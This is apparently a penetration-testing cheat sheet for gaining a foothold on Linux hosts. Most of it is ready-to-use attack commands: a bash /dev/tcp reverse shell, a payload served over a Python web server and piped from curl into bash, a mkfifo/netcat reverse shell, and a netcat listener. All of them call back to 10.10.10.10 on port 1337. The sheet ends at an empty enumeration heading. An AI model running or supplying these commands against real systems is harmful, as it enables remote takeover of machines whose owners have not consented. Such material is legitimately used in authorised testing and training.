# Linux
## Gaining Foothold
#### Three stage-exploit using cURL
1. Create reverse shell payload `echo 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > rev.sh`
2. Spin up a Python3 web server `python3 -m http.server 80`
3. Start up your reverse shell `nc -lnvp 1337`
4. Wherever you have command execution, cURL and execute the payload `curl http://10.10.10.10/rev.sh | bash`

#### Using sh
Deliver the payload
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337 > /tmp/f
```

#### Using Bash to call Bash
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'
```

## Manual Enumeration
